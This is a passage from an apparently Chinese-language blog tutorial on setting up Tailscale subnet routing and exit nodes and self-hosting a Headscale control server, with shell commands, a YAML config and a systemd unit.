class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用操作可以参考：https://tailscale.com/kb/1080/cli/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先进行服务端的配置</span></span><br><span class="line"><span class="comment"># 首先进行登陆，登录到局域网中</span></span><br><span class="line">sudo tailscale up</span><br><span class="line"><span class="comment"># 查看分配到的IP地址</span></span><br><span class="line">tailscale ip</span><br><span class="line"><span class="comment"># 要使Tailscale 网络内的装置可以互通，首先需要启用 Linux 上的 IP 转发(IP Forwarding)</span></span><br><span class="line"><span class="comment"># 因为「Subnet Route」的设定需要用到 IP 转发(IP Forwarding)特性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 /etc/sysctl.conf中添加开启路由转发</span></span><br><span class="line">net.ipv4.ip_forward=1</span><br><span class="line">net.ipv6.conf.all.forwarding=1</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'net.ipv4.ip_forward = 1'</span> | sudo tee -a /etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'net.ipv6.conf.all.forwarding = 1'</span> | sudo tee -a /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#  不需要防火墙配置，会自动管理规则，以允许转发。设定过程也没涉及到iptable，一条指令可以完成</span></span><br><span class="line"><span class="comment"># 最后需要刷新一下</span></span><br><span class="line">sudo sysctl -p /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用IP转发功能时，请确保防火墙默认设置为禁止流量转发。这是ufw和firewall等常见防火墙的默认设置，可确保您的设备不会路由您不想路由的流量。</span></span><br><span class="line"><span class="comment"># 例如需要允许伪装</span></span><br><span class="line"><span class="comment"># firewall-cmd --permanent --add-masquerade</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --accept-routes=true接受其他节点发布的子网路由，Linux设备默认不接受路由</span></span><br><span class="line"><span class="comment"># --accept-dns=false表示从控制面板获取默认dns</span></span><br><span class="line"><span class="comment"># --advertise-routes表示暴露物理子网路由到您的整个Tailscale网络，替换为自己的网段，可以是IPV4或者IPV6，也可以多个网段</span></span><br><span class="line">tailscale up --advertise-routes=192.168.31.0/24 --accept-routes=<span class="literal">true</span> --accept-dns=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>设置完后打开<a href="https://login.tailscale.com/admin/machines" target="_blank" rel="noopener" title="控制台">控制台</a>，首先关闭key过期，不然六个月就需要重新校验了，然后可以看到子网是灰色的，这需要控制台进行同意才行，点击<code>Edit route settings</code>,打开对应的<code>Subnet routes</code>子网即可</p><p><img src="http://qnypic.shawncoding.top/blog/202305301831281.png" alt></p><p>然后进行客户端的配置，下载对应的客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先加入对应局域网，授权登陆</span></span><br><span class="line"><span class="comment"># 对于windows来说，右键在Preferences配置，默认是打开Use Tailscale DNS seetings和Use Tailscale subnets</span></span><br><span class="line"><span class="comment"># 这样就能通过服务端的转发访问服务端内网设备，如果不需要，只需点对点，关闭访问内网即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于linux来说</span></span><br><span class="line"><span class="comment"># --accept-routes=true接受其他节点发布的子网路由，Linux设备默认不接受路由</span></span><br><span class="line"><span class="comment"># --accept-dns=false表示从控制面板获取默认dns</span></span><br><span class="line"><span class="comment"># 下面是能访问其他局域网的命令</span></span><br><span class="line">tailscale up --accept-routes=<span class="literal">true</span> --accept-dns=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置</span></span><br><span class="line">tailscale up --reset</span><br><span class="line"><span class="comment"># 下线</span></span><br><span class="line">tailscale down</span><br><span class="line"><span class="comment"># 帮助文档</span></span><br><span class="line">tailscale -h</span><br><span class="line"><span class="comment"># 设置对应的功能</span></span><br><span class="line">tailscale <span class="built_in">set</span> xxxx</span><br></pre></td></tr></table></figure><h3 id="2-3-出口流量转发">2.3 出口流量转发</h3><blockquote><p>出口节点功能可以通过网络上的特定设备路由所有非tailscale访问互联网。运行出口路由的设备称为出口节点，局域网中的设备可以通过改节点访问互联网，流量都经过该台设备，参考：<a href="https://tailscale.com/kb/1103/exit-nodes" target="_blank" rel="noopener" title="https://tailscale.com/kb/1103/exit-nodes">https://tailscale.com/kb/1103/exit-nodes</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 和访问局域网设备一样，首先需要开启ip流量转发</span></span><br><span class="line"><span class="comment"># 任意一台设备如果想成为出口节点，首先需要显示表示该台设备为出口节点</span></span><br><span class="line">sudo tailscale up --advertise-exit-node</span><br><span class="line"><span class="comment"># 当然也可以加上子网设备，用来访问局域网</span></span><br><span class="line">tailscale up --advertise-routes=192.168.31.0/24 --accept-routes=<span class="literal">true</span> --accept-dns=<span class="literal">false</span> --advertise-exit-node</span><br><span class="line"><span class="comment"># 然后打开控制台，点击Edit route settings中的Use as exit node按钮，开启后该节点就成为出口节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------------------------客户端开启----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># windows客户端右键，点击Exit nodes，这里就可以选择需要代理的节点了</span></span><br><span class="line"><span class="comment"># exit-node-allow-lan-access设置为true，表示当流量通过出口节点路由时，允许直接访问本地网络</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于linux</span></span><br><span class="line"><span class="comment"># 查看连接的节点</span></span><br><span class="line">tailscale status</span><br><span class="line"><span class="comment"># 选择对应的出口节点</span></span><br><span class="line">sudo tailscale up --<span class="built_in">exit</span>-node=&lt;<span class="built_in">exit</span>-node-ip&gt;</span><br><span class="line"><span class="comment"># 选择是否可以访问局域网</span></span><br><span class="line">sudo tailscale up --<span class="built_in">exit</span>-node=&lt;<span class="built_in">exit</span>-node-ip&gt; --<span class="built_in">exit</span>-node-allow-lan-access=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以访问一下，如果显示和真实isp不一致代表成功</span></span><br><span class="line">curl http://myip.ipip.net/</span><br></pre></td></tr></table></figure><h2 id="3、Headscale-部署">3、Headscale 部署</h2><h3 id="3-1-服务端部署">3.1 服务端部署</h3><p>Headscale 部署很简单，推荐直接在 Linux 主机上安装，理论上来说只要你的 Headscale 服务可以暴露到公网出口就行，但最好不要有 NAT，所以推荐将 Headscale 部署在有公网 IP 的云主机上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">wget --output-document=/usr/<span class="built_in">local</span>/bin/headscale \</span><br><span class="line">   https://github.com/juanfont/headscale/releases/download/v&lt;HEADSCALE VERSION&gt;/headscale_&lt;HEADSCALE VERSION&gt;_linux_&lt;ARCH&gt;</span><br><span class="line"><span class="comment"># 自行选择版本，例如我的</span></span><br><span class="line">wget --output-document=/usr/<span class="built_in">local</span>/bin/headscale \</span><br><span class="line">   https://github.com/juanfont/headscale/releases/download/v0.20.0/headscale_0.20.0_linux_amd64</span><br><span class="line"><span class="comment"># # 增加可执行权限</span></span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/headscale</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建配置目录</span></span><br><span class="line">mkdir -p /etc/headscale</span><br><span class="line"><span class="comment"># 创建目录用来存储数据与证书</span></span><br><span class="line">mkdir -p /var/lib/headscale</span><br><span class="line"><span class="comment"># 创建空的 SQLite 数据库文件</span></span><br><span class="line">touch /var/lib/headscale/db.sqlite</span><br><span class="line"><span class="comment"># 创建 Headscale 配置文件</span></span><br><span class="line">wget https://github.com/juanfont/headscale/raw/main/config-example.yaml -O /etc/headscale/config.yaml</span><br></pre></td></tr></table></figure><p>然后修改配置文件，主要是修改几个监听端口、文件位置(都放在/var/lib/headscale，注意权限)、子网段以及unix_socket</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Headscale 服务器的访问地址</span></span><br><span class="line"><span class="comment"># 负载均衡器之后这个地址也必须写成负载均衡器的访问地址</span></span><br><span class="line"><span class="comment"># 修改配置文件，将 server_url 改为公网 IP 或域名(使用域名的话要备案)</span></span><br><span class="line"><span class="comment"># 如果暂时用不到 DNS 功能，可以先将 magic_dns 设为 false</span></span><br><span class="line"><span class="comment"># server_url 设置为 http://&lt;PUBLIC_IP&gt;:8080，将 &lt;PUBLIC_IP&gt; 替换为公网 IP 或者域名</span></span><br><span class="line"><span class="comment"># server_url: http://&lt;ip&gt;:8080</span></span><br><span class="line"><span class="attr">server_url:</span> <span class="string">https://your.domain.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Headscale 实际监听的地址,不要127.0.0.1，否则外网访问不了</span></span><br><span class="line"><span class="attr">listen_addr:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:8080</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监控地址</span></span><br><span class="line"><span class="attr">metrics_listen_addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9090</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># grpc 监听地址，也需要改成0.0.0.0</span></span><br><span class="line"><span class="attr">grpc_listen_addr:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:50443</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否允许不安全的 grpc 连接(非 TLS)</span></span><br><span class="line"><span class="attr">grpc_allow_insecure:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改路径</span></span><br><span class="line"><span class="attr">private_key_path:</span> <span class="string">/var/lib/headscale/private.key</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端分配的内网网段</span></span><br><span class="line"><span class="attr">ip_prefixes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">fd7a:115c:a1e0::/48</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">100.64</span><span class="number">.0</span><span class="number">.0</span><span class="string">/10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">noise:</span></span><br><span class="line">  <span class="comment"># 修改路径</span></span><br><span class="line">  <span class="attr">private_key_path:</span> <span class="string">/var/lib/headscale/noise_private.key</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 中继服务器相关配置</span></span><br><span class="line"><span class="attr">derp:</span></span><br><span class="line">  <span class="attr">server:</span></span><br><span class="line">    <span class="comment"># 关闭内嵌的 derper 中继服务(可能不安全, 还没去看代码)</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 下发给客户端的中继服务器列表(默认走官方的中继节点)</span></span><br><span class="line">  <span class="attr">urls:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://controlplane.tailscale.com/derpmap/default</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 可以在本地通过 yaml 配置定义自己的中继接待</span></span><br><span class="line">  <span class="attr">paths:</span> <span class="string">[]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可自定义私有网段，也可同时开启 IPv4 和 IPv6</span></span><br><span class="line"><span class="attr">ip_prefixes:</span></span><br><span class="line"><span class="comment"># - fd7a:115c:a1e0::/48</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SQLite config，修改位置</span></span><br><span class="line"><span class="attr">db_type:</span> <span class="string">sqlite3</span></span><br><span class="line"><span class="attr">db_path:</span> <span class="string">/var/lib/headscale/db.sqlite</span></span><br><span class="line"><span class="attr">tls_letsencrypt_cache_dir:</span> <span class="string">/var/lib/headscale/cache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改位置</span></span><br><span class="line"><span class="attr">unix_socket:</span> <span class="string">/var/run/headscale/headscale.sock</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自动签发证书是的域名</span></span><br><span class="line"><span class="attr">tls_letsencrypt_hostname:</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自定义证书时的证书路径</span></span><br><span class="line"><span class="attr">tls_cert_path:</span> <span class="string">""</span></span><br><span class="line"><span class="attr">tls_key_path:</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否让客户端使用随机端口, 默认使用 41641/UDP</span></span><br><span class="line"><span class="attr">randomize_client_port:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns_config:</span></span><br><span class="line">  <span class="comment"># 如果暂时用不到 DNS 功能，可以先将 magic_dns 设为 false</span></span><br><span class="line">  <span class="attr">magic_dns:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>配置文件有几点需要说明，可能很多人希望使用 ACME 自动证书, 又不想占用 80/443 端口, 又想通过负载均衡器负载, ;这里详细说明一下 Headscale 证书相关配置和工作逻辑:</p><ul><li>Headscale 的 ACME 只支持 HTTP/TLS , 所以使用后必定占用 80/443</li><li>当配置了 <code>tls_letsencrypt_hostname</code> 时一定会进行 ACME 申请</li><li>在不配置 <code>tls_letsencrypt_hostname</code> 时如果配置了 <code>tls_cert_path</code> 则使用自定义证书</li><li>两者都不配置则不使用任何证书, 服务端监听 HTTP 请求</li><li>三种情况下(ACME 证书、自定义证书、无证书)主服务都只监听 <code>listen_addr</code> 地址, 与 <code>server_url</code> 没关系</li><li>只有在有证书(ACME 证书或自定义证书)的情况下或者手动开启了 <code>grpc_allow_insecure</code> 才会监听 grpc 远程调用服务</li></ul><p>综上所述, 如果你想通过 Nginx、Caddy 反向代理 Headscale, 则你需要满足以下配置:</p><ul><li>删除掉 <code>tls_letsencrypt_hostname</code> 或留空, 防止 ACME 启动</li><li>删除掉 <code>tls_cert_path</code> 或留空, 防止加载自定义证书</li><li><code>server_url</code> 填写 Nginx 或 Caddy 被访问的 HTTPS 地址</li><li>在你的 Nginx 或 Caddy 中反向代理填写 <code>listen_addr</code> 的 HTTP 地址</li></ul><p>Nginx 配置参考 <a href="https://github.com/juanfont/headscale/wiki/nginx-configuration" target="_blank" rel="noopener" title="官方 Wiki">官方 Wiki</a>, Caddy 只需要一行 <code>reverse_proxy headscale:8080</code> 即可(地址自行替换)。至于 ACME 证书你可以通过使用 <code>acme.sh</code> 自动配置 Nginx 或者使用 Caddy 自动申请等方式。</p><p>下一步创建 SystemD service 配置文件，让其能够自己开机自启，<code>vim /etc/systemd/system/headscale.service</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/systemd/system/headscale.service</span></span><br><span class="line">[Unit]</span><br><span class="line">Description=headscale controller</span><br><span class="line">After=syslog.target</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=headscale</span><br><span class="line">Group=headscale</span><br><span class="line">ExecStart=/usr/<span class="built_in">local</span>/bin/headscale serve</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=5</span><br><span class="line"></span><br><span class="line"><span class="comment"># Optional security enhancements</span></span><br><span class="line">NoNewPrivileges=yes</span><br><span class="line">PrivateTmp=yes</span><br><span class="line">ProtectSystem=strict</span><br><span class="line">ProtectHome=yes</span><br><span class="line">ReadWritePaths=/var/lib/headscale /var/run/headscale</span><br><span class="line">AmbientCapabilities=CAP_NET_BIND_SERVICE</span><br><span class="line">RuntimeDirectory=headscale</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>最后环节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建 headscale 用户</span></span><br><span class="line">useradd headscale -d /home/headscale -m</span><br><span class="line"><span class="comment"># 修改 /var/lib/headscale 目录的 owner</span></span><br><span class="line">chown -R headscale:headscale /var/lib/headscale</span><br><span class="line"><span class="comment"># Reload SystemD 以加载新的配置文件</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"><span class="comment"># 启动 Headscale 服务并设置开机自启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> --now headscale</span><br><span class="line"><span class="comment"># systemctl stop headscale</span></span><br><span class="line"><span class="comment"># systemctl disable headscale</span></span><br><span class="line"><span class="comment"># 查看运行状态</span></span><br><span class="line">systemctl status headscale</span><br><span class="line"><span class="comment"># 查看占用端口</span></span><br><span class="line">ss -tulnp|grep headscale</span><br><span class="line"><span class="comment"># 如果出现问题，可以检查一下</span></span><br><span class="line">journalctl -u headscale.service</span><br><span class="line"><span class="comment"># 最后Tailscale 中有一个概念叫 tailnet，可以理解成租户，租户与租户之间是相互隔离的，具体看参考 Tailscale 的官方文档： https://tailscale.com/kb/1136/tailnet/</span></span><br><span class="line"><span class="comment"># Headscale 也有类似的实现叫 namespace，即命名空间。我们需要先创建一个 namespace，以便后续客户端接入，例如</span></span><br><span class="line">headscale namespaces create default</span><br><span class="line"><span class="comment"># 查看命名空间</span></span><br><span class="line">headscale namespaces list</span><br></pre></td></tr></table></figure><h3 id="3-2-Tailscale客户端接入">3.2 Tailscale客户端接入</h3><blockquote><p><a href="https://github.com/juanfont/headscale" target="_blank" rel="noopener" title="https://github.com/juanfont/headscale">https://github.com/juanfont/headscale</a></p></blockquote><ul><li><code>--login-server</code>: 指定使用的中央服务器地址 (必填)</li><li><code>--advertise-routes</code>: 向中央服务器报告当前客户端处于哪个内网网段下, 便于中央服务器让同内网设备直接内网直连 (可选的) 或者将其他设备指定流量路由到当前内网(可选)</li><li><code>--accept-routes</code>: 是否接受中央服务器下发的用于路由到其他客户端内网的路由规则 (可选)</li><li><code>--accept-dns</code>: 是否使用中央服务器下发的 DNS 相关配置 (可选, 推荐关闭)</li><li><code>--advertise-exit-node</code>：是否声明为出口节点，即流量都从这个节点转发(可选,根据自己需求来)</li><li><code>--exit-node=&lt;exit-node-ip&gt; </code>：选择出口节点id(设置了才有)</li><li><code>--exit-node-allow-lan-access=true</code>:是否还可以访问本地地址(设置了出口才可以有)</li></ul><p><strong>Linux</strong></p><p>Tailscale 官方提供了各种 Linux 发行版的软件包，官方还提供了 <a href="https://tailscale.com/download/linux/static" target="_blank" rel="noopener" title="静态编译的二进制文件">静态编译的二进制文件</a>，我们可以直接下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以直接sh下载，不行就下面</span></span><br><span class="line">wget https://pkgs.tailscale.com/stable/tailscale_1.38.1_amd64.tgz</span><br><span class="line">tar zxvf tailscale_1.38.1_amd64.tgz</span><br><span class="line"><span class="comment"># 将二进制文件复制到官方软件包默认的路径下</span></span><br><span class="line">cp tailscale_1.38.1_amd64/tailscaled /usr/sbin/tailscaled</span><br><span class="line">cp tailscale_1.38.1_amd64/tailscale /usr/bin/tailscale</span><br><span class="line"><span class="comment"># systemD service 配置文件复制到系统路径下</span></span><br><span class="line">cp tailscale_1.38.1_amd64/systemd/tailscaled.service /lib/systemd/system/tailscaled.service</span><br><span class="line"><span class="comment"># 将环境变量配置文件复制到系统路径下</span></span><br><span class="line">cp tailscale_1.38.1_amd64/systemd/tailscaled.defaults /etc/default/tailscaled</span><br><span class="line"><span class="comment"># 启动 tailscaled.service 并设置开机自启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> --now tailscaled</span><br><span class="line"><span class="comment"># 查看服务状态</span></span><br><span class="line">systemctl status tailscaled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tailscale 接入 Headscale</span></span><br><span class="line"><span class="comment"># 这里推荐将 DNS 功能关闭，因为它会覆盖系统的默认 DNS。如果你对 DNS 有需求，可自己研究官方文档，这里不再赘述</span></span><br><span class="line"><span class="comment"># 将 &lt;HEADSCALE_PUB_IP&gt; 换成你的 Headscale 公网 IP 或域名</span></span><br><span class="line">tailscale up --login-server=http://&lt;HEADSCALE_PUB_IP&gt;:8080 --accept-routes=<span class="literal">true</span> --accept-dns=<span class="literal">false</span></span><br><span class="line"><span class="comment"># 执行完上面的命令后，会出现授权信息，在浏览器中打开该链接，获得一条链接</span></span><br><span class="line"><span class="comment"># 将其中的命令复制粘贴到 headscale 所在机器的终端中，并将 NAMESPACE 替换为前面所创建的 namespace</span></span><br><span class="line">headscale nodes register --user default--key nodekey:746f2e464177e2cabe1d018940a11041f7d368a022dbd9caad7e9a641ad09803</span><br><span class="line"><span class="comment"># 注册成功，查看注册的节点</span></span><br><span class="line">headscale nodes list</span><br><span class="line"><span class="comment"># 回到 Tailscale 客户端所在的 Linux 主机，可以看到 Tailscale 会自动创建相关的路由表和 iptables 规则</span></span><br><span class="line">ip route show table 52</span><br><span class="line"><span class="comment"># 查看 iptables 规则</span></span><br><span class="line">iptables -S</span><br><span class="line">iptables -S -t nat</span><br></pre></td></tr></table></figure><p><strong>Windows</strong></p><p>Windows Tailscale 客户端想要使用 Headscale 作为控制服务器，只需在浏览器中打开 URL：<code>http://&lt;HEADSCALE_PUB_IP&gt;:8080/windows</code>，按照其中的步骤操作即可</p><p><strong>Android</strong></p><p>Android 客户端从 1.30.0 版本开始支持自定义控制服务器（即 coordination server），你可以通过 <a href="https://play.google.com/store/apps/details?id=com.tailscale.ipn" target="_blank" rel="noopener" title="Google Play">Google Play</a> 或者 <a href="https://f-droid.org/packages/com.tailscale.ipn/" target="_blank" rel="noopener" title="F-Droid">F-Droid</a> 下载最新版本的客户端。安装完成后打开 Tailscale App，开右上角的&quot;三个点&quot;，你会看到只有一个 <code>About</code> 选项，你需要反复不停地<strong>点开再关闭</strong>右上角的&quot;三个点&quot;，重复三四次之后，便会出现一个 <code>Change server</code> 选项，点击 <code>Change server</code>，将 headscale 控制服务器的地址填进去，然后点击 <code>Save and restart</code> 重启，点击 <code>Sign in with other</code>，将其中的命令粘贴到 Headscale 所在主机的终端，将 <strong>NAMESPACE</strong> 替换为之前创建的 namespace，然后执行命令即可。注册成功后可将该页面关闭</p><p><strong>MacOS</strong></p><p>可以参考：<a href="https://github.com/tailscale/tailscale/wiki/Tailscaled-on-macOS" target="_blank" rel="noopener" title="https://github.com/tailscale/tailscale/wiki/Tailscaled-on-macOS">https://github.com/tailscale/tailscale/wiki/Tailscaled-on-macOS</a></p><h3 id="3-3-通过-Pre-Authkeys-接入">3.3 通过 Pre-Authkeys 接入</h3><p>前面的接入方法都需要服务端同意，步骤比较烦琐，其实还有更简单的方法，可以直接接入，不需要服务端同意。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先在服务端生成 pre-authkey 的 token，有效期可以设置为 24 小时</span></span><br><span class="line"><span class="comment"># headscale preauthkeys create -e 24h -n default</span></span><br><span class="line">headscale preauthkeys create -e 24h --user default</span><br><span class="line"><span class="comment"># 查看已经生成的 key,一个是老版命令</span></span><br><span class="line"><span class="comment"># headscale -n default preauthkeys list</span></span><br><span class="line">headscale --user default preauthkeys list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在新节点就可以无需服务端同意直接接入了</span></span><br><span class="line">tailscale up --login-server=http://&lt;HEADSCALE_PUB_IP&gt;:8080 --accept-routes=<span class="literal">true</span> --accept-dns=<span class="literal">false</span> --authkey <span class="variable">$KEY</span></span><br></pre></td></tr></table></figure><h3 id="3-4-局域网互通">3.4 局域网互通</h3><p>和之前一样，通过一台设备转发达到局域网互通</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先需要设置 IPv4 与 IPv6 路由转发</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'net.ipv4.ip_forward = 1'</span> | tee /etc/sysctl.d/ipforwarding.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'net.ipv6.conf.all.forwarding = 1'</span> | tee -a /etc/sysctl.d/ipforwarding.conf</span><br><span class="line">sysctl -p /etc/sysctl.d/ipforwarding.conf</span><br><span class="line"><span class="comment"># 客户端修改注册节点的命令，在原来命令的基础上加上参数 --advertise-routes=192.168.31.0/24，告诉 Headscale 